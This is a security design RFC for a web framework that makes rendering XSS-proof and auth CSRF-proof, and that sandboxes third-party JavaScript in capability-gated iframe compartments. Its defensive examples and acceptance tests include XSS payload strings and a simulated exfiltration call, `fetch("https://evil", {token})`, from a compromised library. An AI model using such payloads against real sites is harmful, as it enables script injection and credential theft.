---
rfc: 0015
title: Web apps secure by construction — the `Js` capability and foreign-code compartments
status: implemented
created: 2026-06-26
superseded-by:
tracking:
---

# RFC-0015: Web apps secure by construction — the `Js` capability and foreign-code compartments

## Summary

Two claims, made true by the shape of the language rather than by careful coding:

1. **A witchy web app is XSS-proof and CSRF-proof by construction.** The DOM-injection
   and ambient-credential footguns do not exist in glamour or the capability model.
2. **Third-party JS/TS can enter only by being *spawned* into a compartment**, gated by a
   new host capability **`Js`** — the browser sibling of `Exec`. Foreign code is never
   *linked* into the trusted surface; it is *spawned* across a boundary with an explicit,
   auditable grant, and the browser actually enforces the box.

Much of the machinery already exists: glamour's DOM shell is structurally `innerHTML`-free
(`web/witchy-runtime/glamour-dom.mjs` — `createNode`/`patch` use `createElement`/
`textContent`/`setAttribute` only); coven-web already ships a double-iframe sandbox
(opaque origin, `connect-src 'none'`, `MessageChannel`) for source viewing; and auth is
already header-bearer, not cookie. This RFC *names the thesis*, closes the two remaining
gaps in glamour's attribute layer, adds Trusted Types as a browser-enforced backstop, and
generalizes the existing sandbox into a first-class, capability-gated `compartment` primitive.

## Motivation

The two dominant web threats are each the inverse of a discipline witchy already enforces:

- **XSS is *data becoming code*.** witchy rendering never crosses that plane — VNodes carry
  text and attributes, never markup or script. Data stays data; there is no sink to inject into.
- **CSRF is *authority exercised without being held*.** It works only because browsers attach
  credentials *ambiently*. witchy has no ambient authority — the session is a capability you
  hold and pass, attached explicitly, never a cookie the browser sends for you.

So "secure by construction" is not new security machinery — it is the capability thesis meeting
the browser. The one thing that obeys neither discipline is third-party code: arbitrary JS with
whatever it can grab. The package registry (coven-web) is the motivating app — it renders
*stranger-uploaded* content (READMEs, source, metadata) and performs *authenticated writes*
(publish/promote/yank), and developers will reasonably want libraries like d3 for charts. The
framework must make using foreign code *safe by default*, so that "I used d3, and d3 turned out
to be compromised" resolves to "it was boxed the whole time; I was fine."

## Design

### 0. The split that drives everything: untrusted *data* vs foreign *code*

| Input | Renderer | Mechanism | Needs `Js`? |
|---|---|---|---|
| Untrusted **data** (README, source, metadata) | witchy/glamour | **Rendered inline, safe by construction** | No |
| Foreign **code** (d3, any 3rd-party JS/TS) | the library itself | **Spawned into a compartment** (iframe + CSP) | **Yes** |

The key consequence of "by construction": because glamour *cannot* produce a sink, an untrusted
README renders **inline in the trusted shell** with no sandbox — the markdown renderer drops raw
HTML and scheme-checks links, so there is nothing to contain. Compartments are reserved for the
genuinely uncontainable case: foreign code. The compartment boundary *is* the witchy/non-witchy line.

### 1. XSS-proof rendering (glamour)

**Already true:** no HTML-string sink anywhere — `createNode`/`patch` build via
`createElement`/`textContent`/`setAttribute`/`addEventListener` only.

**Decision 1a — `prop` may not produce a live handler.** Event handlers attach *only* via the
typed `on(event, msg)` path. The shell rejects any `prop` whose name matches `on*`, so
`prop("onclick", "alert(1)")` is inert by construction:

```js
// glamour-dom.mjs — applyAttr (the single DOM-write choke point)
function applyAttr(el, attr, dispatch) {
  const [kind, a, b] = attr;
  if (kind === "prop") {
    if (/^on/i.test(a)) return;                 // handlers ONLY via on(event,msg); never a string
    if (URL_ATTRS.has(a.toLowerCase())) el.setAttribute(a, safeUrl(b));  // scheme-checked
    else el.setAttribute(a, b);
  } else if (kind === "on") {
    addHandler(el, a, b, dispatch);
  }
}
```

**Decision 1b — URL attributes are scheme-checked.** `href`/`src`/`action`/`formaction`/
`poster`/`xlink:href` accept only relative URLs, `https:`/`http:`/`mailto:`; `img[src]` may also
accept `data:image/*`. Everything else — above all `javascript:` — is dropped to `#`:

```js
const URL_ATTRS = new Set(["href","src","action","formaction","poster","xlink:href"]);
function safeUrl(v) {
  const s = String(v).trim();
  if (/^(https?:|mailto:|\/|\.|#|\?)/i.test(s)) return s;   // relative or safe scheme
  return "#";                                               // javascript:, data:text/html, … → inert
}
```

**Decision 1c — Trusted Types makes it browser-enforced.** glamour's DOM shell registers the
*single* `glamour` Trusted Types policy; the page sends
`Content-Security-Policy: require-trusted-types-for 'script'; trusted-types glamour`. Now even a
*bug* in glamour cannot reach a sink — any other `innerHTML`/`script.src` write throws in the browser:

```js
// glamour-dom.mjs — registered once at mount; the only policy on the page
if (window.trustedTypes?.createPolicy) {
  window.trustedTypes.createPolicy("glamour", {
    createHTML: () => { throw new TypeError("glamour: no raw HTML"); },   // we never make HTML
    createScriptURL: (u) => u === COMPARTMENT_URL ? u : (() => { throw 0; })(),
  });
}
```

**Decision 1d — untrusted markdown renders inline, raw HTML dropped.** The README renderer is
ordinary witchy; it emits VNodes, never passes through raw HTML, and routes link hrefs through
the same scheme check. So it is safe *inline* — no compartment:

```witchy
import markdown
import glamour

# A stranger's README. Safe in the trusted shell BY CONSTRUCTION: markdown.to_vnode
# emits text/elements only, drops raw-HTML blocks, and scheme-checks links.
fn readme_view(md: String) -> VNode(Msg):
    glamour.element("article", [glamour.prop("class", "readme")], [
        markdown.to_vnode(md),
    ])
```

A README containing `<img src=x onerror="steal()">` renders as the literal text of that tag
(raw HTML dropped → shown, not executed); `[click](javascript:steal())` renders a link whose
`href` is sanitized to `#`. Nothing runs.

### 2. CSRF-proof auth (a capability, not a cookie)

**Decision 2a — the session is a bearer capability, never an ambient cookie.** The host shell
holds the token and attaches it explicitly to API requests; it is never a cookie the browser
sends automatically. (coven-web already authenticates via the `authorization` header.) A
cross-site request therefore carries *no* credential — CSRF has nothing to ride.

**Decision 2b — the server rejects ambient-credentialed cross-origin writes** (`Origin` /
`Sec-Fetch-Site` check on state-changing routes) as defense in depth. CSRF is the ambient-authority
bug; witchy has no ambient authority, and the server refuses to pretend otherwise.

### 3. The `Js` capability — spawning foreign code

**Decision 3a — `Js` is a new host capability, the browser sibling of `Exec`.** It is the
authority to *spawn a foreign-code compartment*. Like `Exec` it is conspicuous, footprinted, and
gated by `caps-diff`; unlike `Exec` (whose child runs with full OS authority — confinement ends at
the process boundary) the **browser genuinely confines the child**, so a `Js` grant is *enforced,
not advisory*.

**Decision 3b — `compartment(...)` is a pure VNode builder; authority is realized at the host
boundary.** This resolves the central tension: capabilities cannot round-trip through glamour's
JSON model, and `view` must stay serializable. So — exactly as glamour already treats `After`
(the rune emits a timer *description*; the capability-holding host performs it) — `compartment`
emits a *description*, and the host shell, which alone holds `Js`, performs the spawn. The
footprint analyzer surfaces `Js` from source because the app emits compartment descriptions:

```witchy
# glamour — a new VNode variant + pure builder. No threaded capability value;
# emitting a Compartment is what puts `Js` in the app's footprint.
pub type VNode(msg):
    Element(String, List(Attr(msg)), List(VNode(msg)))
    Text(String)
    Compartment(String, Json, String)        # renderer-id, grant, outbound-event tag

pub fn compartment(renderer: String, grant: Json, on_event: String) -> VNode(msg):
    Compartment(renderer, grant, on_event)
```

```witchy
# The app: embedding d3 is ONE node. The grant is the only data that crosses in;
# `ChartResized` is the only thing the compartment can say back.
fn chart(points: List(Point)) -> VNode(Msg):
    glamour.compartment("d3-runes-chart", points_json(points), "ChartResized")

type Msg derive(Reflect):
    GotCatalog(Int, String)        # the app's own authority: fetch results
    ChartResized(Int)              # the ONLY message the chart compartment can produce
```

**Decision 3c — the compartment's authority profile is the iframe sandbox flags + the served
CSP; the default is `Sealed`.** `Sealed` = opaque origin (`sandbox="allow-scripts"`, no
`allow-same-origin`) + `connect-src 'none'` — no cookies, no parent DOM, no network. The renderer
bundle is served from `/compartments/<id>/` with that locked CSP. Widening (e.g. letting a map
widget fetch one tile origin) is an explicit, separate, auditable spawn variant — you opt *up*,
never start open. The host shell generalizes the existing `/sandbox-frame` double-iframe:

```js
// glamour-dom.mjs — createNode gains a Compartment branch → mountCompartment
function mountCompartment(doc, node, dispatch) {
  const frame = doc.createElement("iframe");
  frame.setAttribute("sandbox", "allow-scripts");          // opaque origin: no cookies/parent/storage
  frame.src = `/compartments/${node.renderer}/`;           // served with its OWN connect-src 'none' CSP
  const ch = new MessageChannel();
  frame.addEventListener("load", () => {
    frame.contentWindow.postMessage({ kind: "init" }, "*", [ch.port2]);
    ch.port1.postMessage({ kind: "grant", data: node.grant });   // public data IN — the whole channel
  });
  ch.port1.onmessage = (ev) => {                                  // narrow channel OUT, schema-checked
    if (ev.data?.kind === "resize" && typeof ev.data.height === "number") {
      frame.style.height = ev.data.height + "px";
      dispatch({ $variant: node.on_event, $values: [ev.data.height] });
    }
    // anything else the frame says is ignored — the boundary is closed
  };
  return frame;
}
```

```html
<!-- /compartments/d3-runes-chart/index.html — the ENTIRE blast radius -->
<!-- Served with: Content-Security-Policy:
       default-src 'none'; script-src 'self'; style-src 'self';
       img-src 'self' data:; connect-src 'none'; base-uri 'none'; form-action 'none' -->
<div id="chart"></div>
<script src="./d3.min.js" integrity="sha384-…"></script>   <!-- 3rd-party, SRI-pinned, runs ONLY here -->
<script>
  addEventListener("message", (e) => {
    const port = e.ports[0]; if (!port) return;
    port.onmessage = (m) => {
      if (m.data.kind !== "grant") return;
      drawChart(m.data.data);                                    // d3 does its thing — boxed
      port.postMessage({ kind: "resize", height: document.body.scrollHeight });
    };
  });
  function drawChart(points) { /* ordinary d3 SVG over {month, count}[] */ }
</script>
```

If d3 is compromised: `document.cookie` is empty (opaque origin), `fetch("https://evil")` is
CSP-blocked (and there is no token in the box anyway), `window.parent` is cross-origin. Worst case:
the chart draws wrong. The session and publish authority are untouched.

### 4. Footprint & audit

**Decision 4a — `witchy caps` reports `Js` and enumerates compartments, derived from source.**
A glamour app with no `compartment(...)` call provably runs zero foreign code; one with them shows
`Js{renderer-ids}` plus, per compartment, the grant shape, the outbound event, and the net profile:

```text
$ witchy caps coven-web
  view     Js{d3-runes-chart}
  main     Console, Net[Connect, Tls], Js{d3-runes-chart}
  total    Console, Net[Connect, Tls], Js{d3-runes-chart}

  Js compartments:
    d3-runes-chart   grant: published-counts   emits: height   profile: Sealed (connect-src 'none')
```

**Decision 4b — `caps-diff` gates new foreign code.** A dependency that newly emits a compartment
(adds `Js`), spawns a new renderer id, or widens a profile beyond `Sealed` is a `WIDENING` — the
exact signal that catches a package trying to smuggle in a library. **Decision 4c —** a grant
document (RFC-0013) may carry a `[compartments]` allowlist the host honors, cross-checked against
this footprint, so deployment can pin *which* foreign bundles may ever spawn.

### 5. coven-web as the reference application

The trusted shell becomes witchy/glamour: it holds `Net` (talk to the registry) and the session
capability, and renders XSS-immune VNodes. READMEs, source, and metadata render **inline** (safe by
construction). The "runes published over time" chart is a **d3 compartment** — the one piece of
foreign code, boxed and auditable. The two host contexts collapse to one rule: *foreign code →
compartment; everything else → inline.* The witchy reverse-proxy server and the host-shell ports
stay as the trust boundary; the four views, Model/Msg/update, and search become witchy/glamour.

## Litmus / acceptance tests

1. **Compromised d3 is contained (headline).** Mount the chart with a *malicious* d3 bundle that
   tries `document.cookie`, `localStorage`, `window.parent.*`, and `fetch("https://evil", {token})`
   after a secret is planted in the parent. Assert: nothing exfiltrated (`connect-src 'none'`),
   cookie unreadable (opaque origin), parent DOM untouched (cross-origin).
2. **XSS is inert.** A README/source/metadata containing `<script>`, `javascript:` href, and
   `onerror=` renders with zero execution in the trusted surface (raw HTML shown as text, scheme
   sanitized, `on*` prop dropped). Verified in jsdom + on both backends for the witchy renderer.
3. **CSRF is rejected.** A cross-site POST to promote/yank with no bearer token (and a foreign
   `Origin`) is refused by the server.
4. **Footprint truth.** An app with no compartment has no `Js`; adding the d3 chart makes `Js`
   appear in `caps-diff` as a widening.

## Alternatives (and why rejected)

- **Compartment everything, including witchy components.** Rejected: witchy is already safe by
  construction; per-component iframes are pure cost and dilute the clean "Js = foreign code" line.
- **Sanitize-on-write only, no Trusted Types.** Rejected: a framework bug could still reach a sink.
  Trusted Types makes the no-sink property *browser-enforced*, not merely *intended*.
- **Cookie auth + CSRF tokens.** Rejected: reintroduces ambient authority. Bearer-capability auth
  removes the attack class instead of patching it.
- **A general `Compartment`/`Embed` capability instead of `Js`.** Considered. `Js` is concrete and
  honest (it runs JavaScript) and pairs cleanly with `Exec`; a future `Wasm`/`Embed` sibling can
  generalize if a second foreign-code kind appears.
- **Thread a `Js` value into `view`.** Rejected: capabilities can't round-trip the JSON model, and
  it would break `view` purity. Emitting a *description* + host-side authority is consistent with
  glamour's existing effects-as-data.

## Drawbacks

- **Foreign code is still foreign.** Isolation contains exfiltration and escalation, not
  *correctness* — a compromised compartment can render wrong or burn CPU; mitigate CPU with frame
  resource hints, accept the rest as the irreducible cost of using a library.
- **CSP needs `wasm-unsafe-eval`** (or fetched-not-eval'd WASM) for the witchy modules — note it and
  prefer streaming compilation.
- **New surface:** a capability, a host function, a VNode variant, and compartment plumbing — but
  most of it reuses the shipped double-iframe and `MessageChannel` bootstrap.
- **WebAuthn/login stays a host-shell port** (a browser-native ceremony), surfaced as its own host
  capability, *not* as `Js` — it is trusted first-party glue, not spawned foreign code.

## Prior art

- RFC-0006 (`html` tagged literal), 0007 (browser/WASM target), 0008 (glamour, effects-as-data) —
  this builds directly on them; the additions are the attribute hardening, Trusted Types, and `Js`.
- RFC-0004 / 0012 (`Exec`) — `Js` is the browser sibling: a named, footprinted spawn with a grant,
  and the same "confinement ends at the boundary" caveat — *improved*, because the browser confines.
- RFC-0011 / 0013 (refinement, grant documents) — compartment grants are auditable footprint; the
  `[compartments]` allowlist is the RFC-0013 grant-doc tie-in.

## Implementation phases

- **Phase A — glamour safety hardening (no new capability).** `applyAttr` URL scheme-check + `on*`
  rejection; the `glamour` Trusted Types policy; `markdown.to_vnode` with raw-HTML drop + link
  sanitization. Tests: jsdom XSS-inert cases + both-backends parity for `markdown`.
- **Phase B — the `Js` capability + `compartment` primitive.** `Compartment` VNode variant + pure
  builder; footprint-analyzer support (`Js{ids}` from source, `caps-diff` gating); host-shell
  `mountCompartment` generalizing `/sandbox-frame`; the compromised-d3 acceptance test.
- **Phase C — framework features for an SPA shell.** Async HTTP effect, client routing
  (pushState + popstate), and keyed-list reconciliation, all effects-as-data with injected ports
  (per the earlier framework design) — needed before the shell can be glamour.
- **Phase D — coven-web rebuild on glamour.** Model/Msg/update/view holding `Net` + session;
  inline README/source; the d3 "runes over time" chart as the live dogfood; `Origin` checks on
  writes; view-by-view migration behind a flag, flipping default once parity holds.

**Parity & gates throughout:** every witchy change works on both backends; `cargo nextest run` green;
`cargo clippy --all-targets -- -D warnings` clean; new user-visible behavior gets a runnable
`book/` example and a differential test.

## Implementation status

All phases shipped; the design is realized as code.

- **Phases A–C — shipped.** glamour's attribute layer is structurally XSS-immune (`applyAttr`
  rejects `on*` props and scheme-checks URL attributes; `glamour-dom.mjs`), the `Js` capability +
  `compartment` builder + host-shell `mountCompartment` exist with footprint/`caps-diff` support,
  and the SPA framework features (async `http` effect, pushState/popstate routing, keyed-list
  reconciliation, host `port` ceremonies) are in glamour, each with a node-DOM differential test
  gated from `tests/glamour_dom.rs`.
- **Phase D — shipped, and the cutover is complete.** coven-web's *entire* frontend is one
  capability-pure glamour rune (`projects/glamour/examples/coven_web_app`, empty footprint),
  compiled to WASM and base64-inlined into `app.js`; the hand-written JS is now only a thin host
  shell (the bootstrap + the session/WebAuthn/yank ports) that holds all authority. The TypeScript
  views/app-logic are deleted. Catalog (with capability-aware search + color-coded footprint
  chips), the signed version record, generated API docs, registry trust, and inline package
  **source** are all glamour views; register/login/promote/yank run through host ports (the token
  and `navigator.credentials` never enter the rune). The app shell CSP gains `'wasm-unsafe-eval'`
  (to compile the trusted app module — strictly narrower than `'unsafe-eval'`, no JS eval) while
  keeping `require-trusted-types-for 'script'; trusted-types 'none'`.
- **One refinement of §0 learned in the build.** Untrusted package *source* is **data**, and
  glamour cannot produce a sink, so it renders **inline** in the trusted shell (no compartment) —
  the double-iframe source sandbox is no longer required for it. Foreign **code** remains the
  compartment case; the `d3-runes-chart` renderer + its host-shell isolation are shipped, served,
  and tested (incl. an in-iframe hostile-probe check that the opaque origin + `connect-src 'none'`
  deny cookies/storage/network/parent-DOM), ready to mount when a chart is wanted.
- **Browser-verified.** The shipped bundle was driven in a real Chromium against a live registry:
  the inlined WASM instantiates in the parent under the hardened CSP with zero console errors, all
  views render, client routing + history fallback work, and the full WebAuthn register → login →
  2FA-promote path completes through a virtual authenticator. (A keyed-vs-unkeyed list-diff bug in
  the host shell was found and fixed during this verification.)
